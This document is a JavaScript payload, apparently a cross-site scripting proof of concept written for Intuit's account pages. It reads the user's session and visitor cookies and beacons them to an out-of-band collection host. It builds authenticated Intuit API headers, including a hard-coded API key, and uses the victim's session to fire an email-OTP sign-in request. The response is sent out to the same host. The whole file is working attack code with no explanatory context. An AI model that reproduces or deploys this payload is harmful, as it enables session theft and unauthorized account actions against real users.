(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}

var session=gc('ius_session');
var visitorId=gc('ivid');

(new Image).src=O+'/p12-a?s='+encodeURIComponent(session.substring(0,40))+'&v='+encodeURIComponent(visitorId.substring(0,40));

var flowId='xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){
var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)
});

(new Image).src=O+'/p12-b?f='+encodeURIComponent(flowId);

var hdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':flowId,
'intuit_offeringid':'Intuit.identity.experiences.oneintuitam',
'intuit_intentassetalias':'Intuit.identity.experiences.oneintuitam',
'intuit_origin':'https://accounts.intuit.com',
'intuit_country':'US',
'intuit_locale':'en-gb',
'intuit_offeringenv':'prd',
'intuit_authn_session_slot':'qbn',
'intuit_samesite_support':'true',
'intuit_identity_routing':'SBSEG',
'intuit_interception':'ignore-response',
'intuit_baggage':btoa(JSON.stringify({scope_area:'remediation',additional_fields:{}}))
};

(new Image).src=O+'/p12-c?hdrs=ok';

var testEmail='poctest'+Math.floor(Math.random()*99999)+'@esiix.com';

(new Image).src=O+'/p12-d?email='+encodeURIComponent(testEmail);

fetch('/factors/v1/verifier/initialize/email',{
method:'POST',
headers:hdrs,
body:JSON.stringify({verifierPolicyId:'emailOtpSignIn',emailAddress:testEmail}),
credentials:'include'
})
.then(function(r){
(new Image).src=O+'/p12-e?status='+r.status;
return r.text()
})
.then(function(body){
(new Image).src=O+'/p12-f?body='+encodeURIComponent(body.substring(0,900));
document.body.innerHTML='<pre style="font:14px monospace;background:#111;color:#0f0;padding:20px">'+body+'</pre>';
})
.catch(function(err){
(new Image).src=O+'/p12-fetch-err?e='+encodeURIComponent(err.message);
document.body.innerHTML='<pre style="color:red;padding:20px">Fetch error: '+err.message+'</pre>';
});

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p12-crash?e='+encodeURIComponent(e.message+'|'+e.stack);
}
})();
